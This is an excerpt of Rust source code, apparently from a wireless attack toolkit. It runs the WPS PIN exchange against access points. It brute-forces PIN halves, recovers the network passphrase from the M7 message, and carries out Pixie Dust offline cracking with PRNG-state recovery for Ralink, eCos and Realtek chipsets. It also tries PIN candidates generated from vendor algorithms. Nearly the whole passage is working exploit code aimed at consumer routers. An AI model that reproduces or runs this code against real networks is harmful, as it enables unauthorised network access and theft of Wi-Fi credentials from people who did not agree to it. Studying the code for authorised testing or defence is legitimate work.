    tx_opts: &TxOptions,
    depth: u8,
    ap_capability: u16,
    ap_rates: &[u8],
    attack_id: AttackId,
) -> ExchangeResult {

    // ── Auth (Open System) ──
    set_phase(shared, info, WpsPhase::Authenticating, attack_id);
    let mut auth_ok = false;
    for attempt in 0..=params.auth_retries {
        if !running.load(Ordering::SeqCst) { return ExchangeResult::Stopped; }
        if attempt > 0 {
            set_detail(info, &format!("AUTH retry {}/{} — waiting {}ms",
                attempt + 1, params.auth_retries + 1, params.auth_retry_delay.as_millis()));
            thread::sleep(params.auth_retry_delay);
        } else {
            set_detail(info, "Sending Open System auth request...");
        }

        let auth_frame = frames::build_auth(
            &session.our_mac,
            &bssid,
            ieee80211::auth_algo::OPEN_SYSTEM,
            1,
            StatusCode::Success,
        );
        let _ = shared.tx_frame(&auth_frame, tx_opts);
        inc_frames_sent(info);
        set_detail_wait(info, &format!("Waiting for auth response (attempt {}/{})",
            attempt + 1, params.auth_retries + 1), params.eap_timeout);

        if let Some(resp) = wait_for_mgmt(reader, &bssid, ieee80211::frame_subtype::AUTH,
                                           params.eap_timeout, running) {
            inc_frames_received(info);
            if let Some((_hdr, body)) = frames::parse_auth(&resp) {
                if body.status == 0 && body.seq == 2 {
                    auth_ok = true;
                    set_detail(info, "Auth response received — authenticated");
                    push_event(shared, events, start, WpsEventKind::AuthSuccess { bssid }, attack_id);
                    break;
                }
            }
        }
    }

    if !auth_ok {
        set_detail(info, &format!("AUTH failed after {} attempts", params.auth_retries + 1));
        push_event(shared, events, start, WpsEventKind::AuthFailed { bssid, attempt: params.auth_retries }, attack_id);
        return ExchangeResult::AuthFailed;
    }

    // ── Assoc with WPS IE ──
    set_phase(shared, info, WpsPhase::Associating, attack_id);
    set_detail(info, "Sending association request with WPS IE...");
    let mut assoc_ok = false;
    let wps_ie = build_wps_assoc_ie();
    for attempt in 0..=params.assoc_retries {
        if !running.load(Ordering::SeqCst) { return ExchangeResult::Stopped; }
        if attempt > 0 {
            set_detail(info, &format!("ASSOC retry {}/{}", attempt + 1, params.assoc_retries + 1));
            thread::sleep(params.auth_retry_delay);
        }

        let mut ies = Vec::with_capacity(256);
        let ssid_bytes = ssid.as_bytes();
        let ssid_len = ssid_bytes.len().min(32) as u8;
        ies.push(0x00); ies.push(ssid_len);
        ies.extend_from_slice(&ssid_bytes[..ssid_len as usize]);

        let basic_rates: Vec<u8> = if ap_rates.is_empty() {
            vec![0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24]
        } else { ap_rates.iter().take(8).copied().collect() };
        ies.push(0x01); ies.push(basic_rates.len() as u8);
        ies.extend_from_slice(&basic_rates);
        if ap_rates.len() > 8 {
            let ext: Vec<u8> = ap_rates.iter().skip(8).copied().collect();
            ies.push(50); ies.push(ext.len() as u8);
            ies.extend_from_slice(&ext);
        }
        ies.extend_from_slice(&wps_ie);

        let assoc_caps = ap_capability & !0x0010;
        let assoc_frame = frames::build_assoc_request(&session.our_mac, &bssid, assoc_caps, 10, &ies);
        if let Some(frame) = assoc_frame {
            let _ = shared.tx_frame(&frame, tx_opts);
            inc_frames_sent(info);
        }

        set_detail_wait(info, &format!("Waiting for assoc response (attempt {}/{})",
            attempt + 1, params.assoc_retries + 1), params.eap_timeout);
        if let Some(resp) = wait_for_mgmt(reader, &bssid, ieee80211::frame_subtype::ASSOC_RESP,
                                           params.eap_timeout, running) {
            inc_frames_received(info);
            if let Some((_hdr, body)) = frames::parse_assoc_response(&resp) {
                if body.status == 0 {
                    assoc_ok = true;
                    set_detail(info, "Associated with WPS IE");
                    push_event(shared, events, start, WpsEventKind::AssocSuccess { bssid }, attack_id);
                    break;
                }
            }
        }
    }

    if !assoc_ok {
        set_detail(info, &format!("ASSOC failed after {} attempts", params.assoc_retries + 1));
        push_event(shared, events, start, WpsEventKind::AssocFailed { bssid, attempt: params.assoc_retries }, attack_id);
        return ExchangeResult::AssocFailed;
    }

    // ── EAPOL-Start ──
    set_detail(info, "Sending EAPOL-Start...");
    let eapol_start = build_eapol_start_frame(&bssid, &session.our_mac);
    let _ = shared.tx_frame(&eapol_start, tx_opts);
    inc_frames_sent(info);

    // ═══════════════════════════════════════════════════════════════════
    //  EAP Exchange Loop — reaver-style general purpose loop
    //
    //  Handles: Identity Request/Response, WSC_Start, and M1 reception
    //  in a single loop with retransmit handling. The AP may retransmit
    //  Identity Requests before processing our response — we just resend.
    // ═══════════════════════════════════════════════════════════════════

    set_phase(shared, info, WpsPhase::EapIdentity, attack_id);
    set_detail_wait(info, "Waiting for EAP Identity Request", params.eap_timeout);
    let mut id_response_sent = false;
    let mut _wsc_start_received = false;
    let mut m1_received = false;
    let eap_deadline = Instant::now() + params.eap_timeout * 3; // overall EAP timeout

    while Instant::now() < eap_deadline && running.load(Ordering::SeqCst) {
        let remaining = eap_deadline.saturating_duration_since(Instant::now());
        let wait_time = remaining.min(params.eap_timeout);

        let eap_data = match wait_for_eap(reader, &bssid, wait_time, running) {
            Some(data) => { inc_frames_received(info); data }
            None => {
                // Timeout — if we haven't sent identity yet, resend EAPOL-Start
                if !id_response_sent {
                    let eapol_start = build_eapol_start_frame(&bssid, &session.our_mac);
                    let _ = shared.tx_frame(&eapol_start, tx_opts);
                    inc_frames_sent(info);
                    continue;
                }
                break; // genuine timeout after identity sent
            }
        };

        if eap_data.len() < 2 { continue; }
        session.eap_id = eap_data[1];

        // Check EAP code byte
        let eap_code = eap_data[0];

        // EAP-Failure (code 4)
        if eap_code == 4 {
            push_event(shared, events, start, WpsEventKind::EapFailure, attack_id);
            return ExchangeResult::Locked;
        }

        // Try parsing as EAP-WSC (Expanded type 254)
        if let Some(wsc) = parse_eap_wsc(&eap_data) {
            match wsc.op_code {
                opcode::WSC_START => {
                    // AP sent WSC_Start — it's ready for the exchange
                    _wsc_start_received = true;
                    set_phase(shared, info, WpsPhase::WscStart, attack_id);
                    set_detail(info, "WSC_Start received — waiting for M1...");
                    push_event(shared, events, start, WpsEventKind::WscStartReceived, attack_id);
                    continue; // now wait for M1
                }
                opcode::WSC_MSG => {
                    // This should be M1 from the AP
                    set_phase(shared, info, WpsPhase::M1Received, attack_id);
                    set_detail(info, "M1 received — parsing AP device info + public key...");
                    // Dump M1 TLVs for protocol debugging
                    {
                        use std::io::Write;
                        if let Ok(mut f) = std::fs::OpenOptions::new().create(true).append(true)
                            .open("/tmp/wifikit_wps_eap_debug.txt") {
                            let _ = writeln!(f, "\n=== M1 BODY DUMP ({} bytes) ===", wsc.body.len());
                            for tlv in WpsTlvIterator::new(wsc.body) {
                                let val_hex: String = tlv.data.iter().take(32).map(|b| format!("{:02x}", b)).collect::<Vec<_>>().join(" ");
                                let truncated = if tlv.data.len() > 32 { "..." } else { "" };
                                let _ = writeln!(f, "  TLV {:04x} len={}: {}{}", tlv.attr_type, tlv.data.len(), val_hex, truncated);
                            }
                            let _ = writeln!(f, "=== END M1 DUMP ===\n");
                        }
                    }
                    if !session.parse_m1(wsc.body) { return ExchangeResult::M1Failed; }
                    push_event(shared, events, start, WpsEventKind::MessageReceived { msg_type: WpsMessageType::M1 }, attack_id);

                    // Emit AP device info
                    let di = &session.ap_device_info;
                    push_event(shared, events, start, WpsEventKind::ApDeviceInfo {
                        manufacturer: di.manufacturer.clone(),
                        model_name: di.model_name.clone(),
                        model_number: di.model_number.clone(),
                        serial_number: di.serial_number.clone(),
                        device_name: di.device_name.clone(),
                    }, attack_id);
                    {
                        let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
                        i.ap_manufacturer = di.manufacturer.clone();
                        i.ap_model_name = di.model_name.clone();
                        i.ap_model_number = di.model_number.clone();
                        i.ap_serial_number = di.serial_number.clone();
                        i.ap_device_name = di.device_name.clone();
                    }
                    m1_received = true;
                    break;
                }
                opcode::WSC_NACK => {
                    if let Some(ce) = extract_config_error(wsc.body) {
                        push_event(shared, events, start, WpsEventKind::WscNackReceived { config_error: Some(ce) }, attack_id);
                        if ce == 15 || ce == 18 { return ExchangeResult::Locked; }
                    }
                    return ExchangeResult::M1Failed;
                }
                _ => continue, // unknown opcode, keep looping
            }
        }

        // Not EAP-WSC — likely an EAP Identity Request (type 1)
        // Check if it's an Identity Request and (re)send our response
        if eap_data.len() >= 5 && eap_code == 1 {
            // EAP-Request, check type byte at offset 4
            let eap_type = eap_data[4];
            if eap_type == 1 {
                // Identity Request — (re)send Identity Response
                let identity_resp = build_eap_identity_response(session.eap_id);
                let data_frame = build_data_frame(&bssid, &session.our_mac, &identity_resp);

                // Debug: dump the exact frame we're sending
                {
                    use std::io::Write;
                    if let Ok(mut f) = std::fs::OpenOptions::new().create(true).append(true)
                        .open("/tmp/wifikit_wps_eap_debug.txt") {
                        let hex: String = data_frame.iter().take(80).map(|b| format!("{:02x}", b)).collect::<Vec<_>>().join(" ");
                        let _ = writeln!(f, "\n>>> TX IDENTITY RESPONSE ({} bytes) eap_id={} our_mac={}",
                            data_frame.len(), session.eap_id, session.our_mac);
                        let _ = writeln!(f, ">>> TX HEX: {}", hex);
                    }
                }

                let _ = shared.tx_frame(&data_frame, tx_opts);
                inc_frames_sent(info);
                if !id_response_sent {
                    set_detail(info, "Sending EAP Identity: WFA-SimpleConfig-Registrar-1-0");
                    push_event(shared, events, start, WpsEventKind::EapIdentitySent, attack_id);
                    id_response_sent = true;
                    set_phase(shared, info, WpsPhase::WscStart, attack_id);
                }
                continue; // keep looping for WSC_Start/M1
            }
        }

        // Unknown EAP frame — skip and keep looping
    }

    if !m1_received {
        if !id_response_sent {
            return ExchangeResult::EapFailed;
        }
        return ExchangeResult::M1Failed;
    }

    // ── Send M2 (registrar nonce, PKr) ──
    set_phase(shared, info, WpsPhase::M2Sent, attack_id);
    set_detail(info, "Deriving AuthKey + KeyWrapKey from DH exchange...");

    // Derive keys: DH shared secret from PKe + our privkey
    let enrollee_mac = session.ap_device_info.mac_address.unwrap_or(*bssid.as_bytes());
    session.derive_keys(&enrollee_mac);
    if !session.has_keys { return ExchangeResult::M1Failed; }
    push_event(shared, events, start, WpsEventKind::KeysDerived, attack_id);
    set_detail(info, "Keys derived — building M2 with registrar nonce + PKr...");

    let m2_body = match session.build_m2_body(params) {
        Some(b) => b,
        None => return ExchangeResult::EapFailed,
    };
    // Debug: dump M2 TLV body for protocol analysis
    {
        use std::io::Write;
        if let Ok(mut f) = std::fs::OpenOptions::new().create(true).append(true)
            .open("/tmp/wifikit_wps_eap_debug.txt") {
            let _ = writeln!(f, "\n=== M2 BODY DUMP ({} bytes) ===", m2_body.len());
            for tlv in WpsTlvIterator::new(&m2_body) {
                let val_hex: String = tlv.data.iter().take(32).map(|b| format!("{:02x}", b)).collect::<Vec<_>>().join(" ");
                let truncated = if tlv.data.len() > 32 { "..." } else { "" };
                let _ = writeln!(f, "  TLV {:04x} len={}: {}{}", tlv.attr_type, tlv.data.len(), val_hex, truncated);
            }
            let _ = writeln!(f, "=== END M2 DUMP ===\n");
        }
    }
    session.last_msg_body = m2_body.clone();
    let m2_eap = build_eap_wsc_msg(session.eap_id, opcode::WSC_MSG, &m2_body);
    let m2_frame = build_data_frame(&bssid, &session.our_mac, &m2_eap);
    let _ = shared.tx_frame(&m2_frame, tx_opts);
    inc_frames_sent(info);
    push_event(shared, events, start, WpsEventKind::MessageSent { msg_type: WpsMessageType::M2 }, attack_id);
    set_detail_wait(info, "M2 sent \u{2014} waiting for M3 (E-Hash1, E-Hash2)", params.eap_timeout);

    // ── Receive M3 from AP (E-Hash1, E-Hash2) ──
    // Drain stale frames from subscriber queue before waiting for M3.
    // In single-adapter mode, feed_from can duplicate frames, causing
    // leftover M1/WSC_Start to be picked up as false M3 matches.
    reader.drain();
    set_phase(shared, info, WpsPhase::M3Received, attack_id);
    let eap_data = match wait_for_eap(reader, &bssid, params.eap_timeout, running) {
        Some(data) => { inc_frames_received(info); data }
        None => return ExchangeResult::M3Failed,
    };

    if let Some(wsc) = parse_eap_wsc(&eap_data) {
        if wsc.op_code == opcode::WSC_NACK {
            if let Some(ce) = extract_config_error(wsc.body) {
                push_event(shared, events, start, WpsEventKind::WscNackReceived { config_error: Some(ce) }, attack_id);
                if ce == 15 || ce == 18 { return ExchangeResult::Locked; }
            }
            return ExchangeResult::M3Failed;
        }
        if eap_data.first() == Some(&4) { return ExchangeResult::Locked; }
        if wsc.op_code != opcode::WSC_MSG { return ExchangeResult::M3Failed; }
        session.eap_id = eap_data[1];

        if !session.parse_m3(wsc.body) { return ExchangeResult::M3Failed; }
        push_event(shared, events, start, WpsEventKind::MessageReceived { msg_type: WpsMessageType::M3 }, attack_id);
    } else {
        return ExchangeResult::M3Failed;
    }

    // For Pixie Dust, we stop here — we have E-Hash1/E-Hash2 for offline cracking
    if depth == 0 {
        return ExchangeResult::GotM4; // Pixie Dust: got E-Hash data
    }

    // ── Send M4 (R-Hash1, R-Hash2, encrypted R-S1) ──
    set_phase(shared, info, WpsPhase::M4Sent, attack_id);
    set_detail(info, "M3 parsed — building M4 with R-Hash1, R-Hash2...");
    let m4_body = match session.build_m4_body() {
        Some(b) => b,
        None => return ExchangeResult::EapFailed,
    };
    session.last_msg_body = m4_body.clone();
    let m4_eap = build_eap_wsc_msg(session.eap_id, opcode::WSC_MSG, &m4_body);
    let m4_frame = build_data_frame(&bssid, &session.our_mac, &m4_eap);
    let _ = shared.tx_frame(&m4_frame, tx_opts);
    inc_frames_sent(info);
    push_event(shared, events, start, WpsEventKind::MessageSent { msg_type: WpsMessageType::M4 }, attack_id);
    set_detail_wait(info, "M4 sent \u{2014} waiting for M5 (validates first PIN half)", params.eap_timeout);

    // ── Receive M5 from AP (encrypted E-S1 — first half correct!) ──
    // If NACK here: first PIN half is WRONG
    reader.drain();
    set_phase(shared, info, WpsPhase::M5Received, attack_id);
    let eap_data = match wait_for_eap(reader, &bssid, params.eap_timeout, running) {
        Some(data) => { inc_frames_received(info); data }
        None => return ExchangeResult::Half1Wrong,
    };

    if let Some(wsc) = parse_eap_wsc(&eap_data) {
        if wsc.op_code == opcode::WSC_NACK || eap_data.first() == Some(&4) {
            if let Some(ce) = extract_config_error(wsc.body) {
                if ce == 15 || ce == 18 { return ExchangeResult::Locked; }
            }
            return ExchangeResult::Half1Wrong;
        }
        if wsc.op_code != opcode::WSC_MSG { return ExchangeResult::Half1Wrong; }
        session.eap_id = eap_data[1];

        if !session.parse_m5(wsc.body) { return ExchangeResult::Half1Wrong; }
        push_event(shared, events, start, WpsEventKind::MessageReceived { msg_type: WpsMessageType::M5 }, attack_id);
    } else {
        return ExchangeResult::Half1Wrong;
    }

    // First half correct! For brute force Phase 1, return here.
    if depth == 1 {
        return ExchangeResult::Half1Correct;
    }

    // ── Send M6 (encrypted R-S2) ──
    set_phase(shared, info, WpsPhase::M6Sent, attack_id);
    let m6_body = match session.build_m6_body() {
        Some(b) => b,
        None => return ExchangeResult::EapFailed,
    };
    session.last_msg_body = m6_body.clone();
    let m6_eap = build_eap_wsc_msg(session.eap_id, opcode::WSC_MSG, &m6_body);
    let m6_frame = build_data_frame(&bssid, &session.our_mac, &m6_eap);
    let _ = shared.tx_frame(&m6_frame, tx_opts);
    inc_frames_sent(info);
    push_event(shared, events, start, WpsEventKind::MessageSent { msg_type: WpsMessageType::M6 }, attack_id);

    // ── Receive M7 from AP (encrypted E-S2 + credentials!) ──
    // If NACK here: second PIN half is WRONG
    reader.drain();
    set_phase(shared, info, WpsPhase::M7Received, attack_id);
    let eap_data = match wait_for_eap(reader, &bssid, params.eap_timeout, running) {
        Some(data) => { inc_frames_received(info); data }
        None => return ExchangeResult::Half2Wrong,
    };

    if let Some(wsc) = parse_eap_wsc(&eap_data) {
        if wsc.op_code == opcode::WSC_NACK || eap_data.first() == Some(&4) {
            return ExchangeResult::Half2Wrong;
        }
        if wsc.op_code != opcode::WSC_MSG { return ExchangeResult::Half2Wrong; }
        session.eap_id = eap_data[1];

        // Parse M7 — extract credentials (the holy grail!)
        if let Some(psk) = session.parse_m7(wsc.body) {
            push_event(shared, events, start, WpsEventKind::MessageReceived { msg_type: WpsMessageType::M7 }, attack_id);

            // Send WSC_NACK to cleanly terminate (we have what we need)
            let nack_body = build_wsc_nack(&session.e_nonce, &session.r_nonce, config_error::NO_ERROR);
            let nack_eap = build_eap_wsc_msg(session.eap_id, opcode::WSC_NACK, &nack_body);
            let nack_frame = build_data_frame(&bssid, &session.our_mac, &nack_eap);
            let _ = shared.tx_frame(&nack_frame, tx_opts);
            inc_frames_sent(info);

            return ExchangeResult::PinCorrect { psk };
        } else {
            return ExchangeResult::Half2Wrong;
        }
    }

    ExchangeResult::Half2Wrong
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Pixie Dust Offline Cracker
// ═══════════════════════════════════════════════════════════════════════════════

/// Try to crack WPS PIN offline using known weak E-S1/E-S2 patterns (Pixie Dust).
///
/// As Registrar, we have E-Hash1/E-Hash2 from AP's M3.
/// E-Hash1 = HMAC(AuthKey, E-S1 || PSK1[0:16] || PKe || PKr)
/// If E-S1 is predictable (zero, nonce-derived, etc.), brute force PIN halves.
fn pixie_crack(session: &WpsSession) -> Option<String> {
    let zero16 = [0u8; 16];

    // E-S1 candidates: actual (if we got M5), zero, enrollee nonce
    let mut es1_candidates: Vec<&[u8; 16]> = vec![&zero16];
    if session.has_e_s1 {
        es1_candidates.insert(0, &session.e_s1);
    }
    // Also try enrollee nonce as E-S1 (some weak implementations do this)
    es1_candidates.push(&session.e_nonce);

    let mut es2_candidates: Vec<&[u8; 16]> = vec![&zero16];
    if session.has_e_s2 {
        es2_candidates.insert(0, &session.e_s2);
    }
    es2_candidates.push(&session.e_nonce);

    for es1 in &es1_candidates {
        for pin1 in 0u16..10000 {
            let half1_str = format!("{:04}", pin1);

            let psk1 = match wps_hmac_sha256(&session.authkey, half1_str.as_bytes()) {
                Some(h) => h,
                None => continue,
            };

            // E-Hash1 = HMAC(AuthKey, E-S1 || PSK1[0:16] || PKe || PKr)
            let computed = match wps_hmac_sha256_multi(
                &session.authkey,
                &[*es1, &psk1[..16], &session.pke, &session.pubkey],
            ) {
                Some(h) => h,
                None => continue,
            };

            if computed == session.e_hash1 {
                // First half found! Crack second half.
                for es2 in &es2_candidates {
                    for pin2_3 in 0u16..1000 {
                        let full7 = pin1 as u32 * 1000 + pin2_3 as u32;
                        let chk = wps_pin_checksum(full7);
                        let half2_str = format!("{:03}{}", pin2_3, chk);

                        let psk2 = match wps_hmac_sha256(&session.authkey, half2_str.as_bytes()) {
                            Some(h) => h,
                            None => continue,
                        };
                        // E-Hash2 = HMAC(AuthKey, E-S2 || PSK2[0:16] || PKe || PKr)
                        let computed2 = match wps_hmac_sha256_multi(
                            &session.authkey,
                            &[*es2, &psk2[..16], &session.pke, &session.pubkey],
                        ) {
                            Some(h) => h,
                            None => continue,
                        };

                        if computed2 == session.e_hash2 {
                            return Some(format!("{}{}", half1_str, half2_str));
                        }
                    }
                }
            }
        }
    }

    None
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Computed PIN — try vendor-specific PIN generation algorithms
// ═══════════════════════════════════════════════════════════════════════════════

#[allow(clippy::too_many_arguments)]
fn run_computed_pins(
    shared: &SharedAdapter,
    reader: &crate::pipeline::PipelineSubscriber,
    bssid: MacAddress,
    ssid: &str,
    params: &WpsParams,
    session: &mut WpsSession,
    info: &Arc<Mutex<WpsInfo>>,
    events: &Arc<EventRing<WpsEvent>>,
    running: &Arc<AtomicBool>,
    start: Instant,
    tx_opts: &TxOptions,
    ap_capability: u16,
    ap_rates: &[u8],
    serial: &Option<String>,
    attack_id: AttackId,
) {
    use crate::protocol::wps_pin_gen::generate_pins;

    let candidates = generate_pins(&bssid, serial.as_deref());
    if candidates.is_empty() {
        push_event(shared, events, start, WpsEventKind::PinGenFailed, attack_id);
        return;
    }

    push_event(shared, events, start, WpsEventKind::PinGenStarted { candidates: candidates.len() }, attack_id);

    for (idx, candidate) in candidates.iter().enumerate() {
        if !running.load(Ordering::SeqCst) { break; }

        push_event(shared, events, start, WpsEventKind::PinGenAttempt {
            pin: candidate.pin.clone(),
            algo: candidate.algo.name().to_string(),
            attempt: idx + 1,
            total: candidates.len(),
        }, attack_id);

        // Set the PIN for this exchange
        session.pin = candidate.pin.clone();

        // Update info
        {
            let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
            i.current_pin = candidate.pin.clone();
            i.attempts += 1;
        }

        // Try full exchange (depth=2: complete through M7, extract credentials)
        let result = wps_single_exchange(
            shared, reader, bssid, ssid, params, session, info, events, running, start,
            tx_opts, 2, ap_capability, ap_rates, attack_id,
        );

        match result {
            ExchangeResult::PinCorrect { psk } => {
                push_event(shared, events, start, WpsEventKind::PinGenSuccess {
                    pin: candidate.pin.clone(),
                    algo: candidate.algo.name().to_string(),
                    psk: psk.clone(),
                }, attack_id);
                set_status(info, WpsStatus::Success);
                let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
                i.pin_found = Some(candidate.pin.clone());
                i.psk_found = Some(psk);
                return;
            }
            ExchangeResult::Locked => {
                set_status(info, WpsStatus::Locked);
                return;
            }
            _ => {
                // PIN wrong or exchange failed — try next candidate
                if params.delay_between_attempts > Duration::ZERO {
                    thread::sleep(params.delay_between_attempts);
                }
            }
        }
    }

    push_event(shared, events, start, WpsEventKind::PinGenFailed, attack_id);
}

/// Enhanced Pixie Dust cracking: try simple candidates first, then PRNG recovery modes.
///
/// Order:
/// 1. Simple mode (zero, e_nonce, actual E-S1 if available) — instant
/// 2. Ralink LFSR recovery from E-Nonce — instant if LFSR state reconstructs
/// 3. eCos simple LCG — ~33M candidates, seconds
/// 4. Realtek timestamp — ~172K candidates, fast
/// 5. eCos simplest — ~33M candidates, seconds
/// 6. eCos Knuth — ~33M candidates, seconds
///
/// Returns (pin_string, mode_name) on success.
fn pixie_crack_enhanced(
    session: &WpsSession,
    shared: &SharedAdapter,
    events: &Arc<EventRing<WpsEvent>>,
    start: Instant,
    attack_id: AttackId,
) -> Option<(String, &'static str)> {
    // 1. Simple mode (existing fast path)
    push_event(shared, events, start, WpsEventKind::PixiePrngMode { mode: "simple".to_string() }, attack_id);
    if let Some(pin) = pixie_crack(session) {
        return Some((pin, "simple"));
    }

    // For PRNG recovery, we need the E-Nonce
    let e_nonce = &session.e_nonce;

    // 2. Ralink LFSR
    push_event(shared, events, start, WpsEventKind::PixiePrngMode { mode: "ralink-lfsr".to_string() }, attack_id);
    if let Some((e_s1, e_s2)) = crate::protocol::wps::pixie_recover_ralink(e_nonce) {
        if let Some(pin) = pixie_crack_with_secrets(session, &e_s1, &e_s2) {
            push_event(shared, events, start, WpsEventKind::PixiePrngRecovered {
                mode: "ralink-lfsr".to_string(), elapsed_ms: start.elapsed().as_millis() as u64,
            }, attack_id);
            return Some((pin, "ralink-lfsr"));
        }
    }

    // 3. eCos simple LCG
    push_event(shared, events, start, WpsEventKind::PixiePrngMode { mode: "ecos-simple".to_string() }, attack_id);
    if let Some((e_s1, e_s2)) = crate::protocol::wps::pixie_recover_ecos_simple(e_nonce) {
        if let Some(pin) = pixie_crack_with_secrets(session, &e_s1, &e_s2) {
            push_event(shared, events, start, WpsEventKind::PixiePrngRecovered {
                mode: "ecos-simple".to_string(), elapsed_ms: start.elapsed().as_millis() as u64,
            }, attack_id);
            return Some((pin, "ecos-simple"));
        }
    }

    // 4. Realtek timestamp (use current Unix time as center)
    push_event(shared, events, start, WpsEventKind::PixiePrngMode { mode: "realtek-timestamp".to_string() }, attack_id);
    let now_secs = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs() as u32;
    if let Some((e_s1, e_s2)) = crate::protocol::wps::pixie_recover_realtek_timestamp(e_nonce, now_secs) {
        if let Some(pin) = pixie_crack_with_secrets(session, &e_s1, &e_s2) {
            push_event(shared, events, start, WpsEventKind::PixiePrngRecovered {
                mode: "realtek-timestamp".to_string(), elapsed_ms: start.elapsed().as_millis() as u64,
            }, attack_id);
            return Some((pin, "realtek-timestamp"));
        }
    }

    // 5. eCos simplest
    push_event(shared, events, start, WpsEventKind::PixiePrngMode { mode: "ecos-simplest".to_string() }, attack_id);
    if let Some((e_s1, e_s2)) = crate::protocol::wps::pixie_recover_ecos_simplest(e_nonce) {
        if let Some(pin) = pixie_crack_with_secrets(session, &e_s1, &e_s2) {
            push_event(shared, events, start, WpsEventKind::PixiePrngRecovered {
                mode: "ecos-simplest".to_string(), elapsed_ms: start.elapsed().as_millis() as u64,
            }, attack_id);
            return Some((pin, "ecos-simplest"));
        }
    }

    // 6. eCos Knuth
    push_event(shared, events, start, WpsEventKind::PixiePrngMode { mode: "ecos-knuth".to_string() }, attack_id);
    if let Some((e_s1, e_s2)) = crate::protocol::wps::pixie_recover_ecos_knuth(e_nonce) {
        if let Some(pin) = pixie_crack_with_secrets(session, &e_s1, &e_s2) {
            push_event(shared, events, start, WpsEventKind::PixiePrngRecovered {
                mode: "ecos-knuth".to_string(), elapsed_ms: start.elapsed().as_millis() as u64,
            }, attack_id);
            return Some((pin, "ecos-knuth"));
        }
    }

    None
}

/// Crack PIN halves given known E-S1 and E-S2 values recovered from PRNG.
fn pixie_crack_with_secrets(session: &WpsSession, e_s1: &[u8; 16], e_s2: &[u8; 16]) -> Option<String> {
    // Brute force first half (0000-9999) against E-Hash1 using known E-S1
    for pin1 in 0u16..10000 {
        let half1_str = format!("{:04}", pin1);
        let psk1 = wps_hmac_sha256(&session.authkey, half1_str.as_bytes())?;
        let computed = wps_hmac_sha256_multi(
            &session.authkey,
            &[e_s1.as_ref(), &psk1[..16], &session.pke, &session.pubkey],
        )?;
        if computed == session.e_hash1 {
            // First half found, now crack second half with E-S2
            for pin2_3 in 0u16..1000 {
                let full7 = pin1 as u32 * 1000 + pin2_3 as u32;
                let chk = wps_pin_checksum(full7);
                let half2_str = format!("{:03}{}", pin2_3, chk);
                let psk2 = wps_hmac_sha256(&session.authkey, half2_str.as_bytes())?;
                let computed2 = wps_hmac_sha256_multi(
                    &session.authkey,
                    &[e_s2.as_ref(), &psk2[..16], &session.pke, &session.pubkey],
                )?;
                if computed2 == session.e_hash2 {
                    return Some(format!("{}{}", half1_str, half2_str));
                }
            }
        }
    }
    None
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Frame helpers
// ═══════════════════════════════════════════════════════════════════════════════

/// Build an 802.11 Data frame with LLC/SNAP + EAPOL wrapping for EAP payload.
/// Build an EAPOL-Start frame to trigger the AP's EAP authentication.
///
/// After association, the AP waits for this frame before sending EAP-Request/Identity.
/// Format: 802.11 Data (ToDS) + LLC/SNAP (0x888E) + EAPOL header (type=1 Start, len=0).
fn build_eapol_start_frame(bssid: &MacAddress, our_mac: &MacAddress) -> Vec<u8> {
    let mut buf = Vec::with_capacity(24 + 8 + 4);

    // 802.11 Data header (ToDS)
    buf.push(fc::DATA);
    buf.push(fc_flags::TO_DS);
    buf.push(0x3A); buf.push(0x01); // Duration
    buf.extend_from_slice(bssid.as_bytes());  // Addr1 = BSSID (RA)
    buf.extend_from_slice(our_mac.as_bytes()); // Addr2 = SA
    buf.extend_from_slice(bssid.as_bytes());  // Addr3 = DA
    buf.push(0x00); buf.push(0x00); // Seq Control

    // LLC/SNAP (EAPOL ethertype 0x888E)
    buf.extend_from_slice(&[0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E]);

    // EAPOL header: Version=1, Type=1 (Start), Body Length=0
    buf.push(0x01); // Version
    buf.push(0x01); // Type: EAPOL-Start
    buf.push(0x00); // Body length high
    buf.push(0x00); // Body length low

    buf
}

fn build_data_frame(bssid: &MacAddress, our_mac: &MacAddress, eap_data: &[u8]) -> Vec<u8> {
    let mut buf = Vec::with_capacity(24 + 8 + 4 + eap_data.len());

    // 802.11 Data header (ToDS)
    buf.push(fc::DATA);
    buf.push(fc_flags::TO_DS);
    // Duration
    buf.push(0x3A);
    buf.push(0x01);
    // Addr1 = BSSID (RA)
    buf.extend_from_slice(bssid.as_bytes());
    // Addr2 = SA (our MAC)
    buf.extend_from_slice(our_mac.as_bytes());
    // Addr3 = DA (AP)
    buf.extend_from_slice(bssid.as_bytes());
    // Seq Control
    buf.push(0x00);
    buf.push(0x00);

    // LLC/SNAP (8 bytes)
    buf.extend_from_slice(&[0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E]);

    // EAPOL header (4 bytes)
    buf.push(0x01); // Version
    buf.push(0x00); // Type: EAP Packet
    buf.push((eap_data.len() >> 8) as u8);
    buf.push(eap_data.len() as u8);

    // EAP payload
    buf.extend_from_slice(eap_data);

    buf
}

/// Wait for a management frame of a specific subtype from a BSSID.
fn wait_for_mgmt(
    reader: &crate::pipeline::PipelineSubscriber,
    bssid: &MacAddress,
    subtype: u8,
    timeout: Duration,
    running: &Arc<AtomicBool>,
) -> Option<Vec<u8>> {
    let deadline = Instant::now() + timeout;

    while Instant::now() < deadline && running.load(Ordering::SeqCst) {
        let remaining = deadline.saturating_duration_since(Instant::now());
        let poll = remaining.min(Duration::from_millis(200));

        if let Some(frame) = reader.recv_timeout(poll) {
            // Use pre-parsed frame fields instead of raw byte parsing
            if frame.frame_type == 0 && frame.frame_subtype == subtype {
                if frame.addr2.as_ref() == Some(bssid) {
                    return Some(frame.raw.to_vec());
                }
            }
        }
    }
    None
}

/// Wait for an EAP frame from the AP (Data frame with LLC/SNAP + EAPOL).
///
/// Uses `ieee80211::eapol::LLC_SNAP` and `eapol::parse_header()` from the
/// protocol layer instead of hardcoding LLC/SNAP bytes and EAPOL parsing.
fn wait_for_eap(
    reader: &crate::pipeline::PipelineSubscriber,
    bssid: &MacAddress,
    timeout: Duration,
    running: &Arc<AtomicBool>,
) -> Option<Vec<u8>> {
    use crate::core::parsed_frame::{FrameBody, DataPayload};
